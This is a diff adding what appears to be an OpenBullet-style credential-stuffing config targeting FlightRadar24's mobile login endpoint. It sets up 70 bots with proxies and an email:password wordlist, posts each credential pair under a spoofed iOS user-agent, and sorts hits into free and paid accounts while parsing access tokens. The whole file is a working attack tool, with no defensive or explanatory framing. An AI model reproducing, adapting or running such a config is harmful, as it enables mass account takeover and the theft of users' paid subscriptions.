@@ -1,0 +1,76 @@
+[SETTINGS]
+{
+  "Name": "FlightRadar24.com",
+  "SuggestedBots": 70,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-04T21:50:32.0318505+03:00",
+  "AdditionalInfo": "",
+  "Author": "KaraMeleKk",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+REQUEST POST "https://mobile.flightradar24.com/mobile/login?device=ios" 
+  CONTENT "email=<US>&password=<PASS>&remember=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "content-type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "user-agent: FlightradarFree/2022051301 CFNetwork/1329 Darwin/21.3.0" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "success\":false" 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+
+#token1 PARSE "<SOURCE>" JSON "accessToken" -> VAR "token1" 
+
+#logintoken PARSE "<SOURCE>" JSON "tokenLogin" -> VAR "logintoken" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"accountType\":\"free" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "\",\"accountType\":\"free" 
+
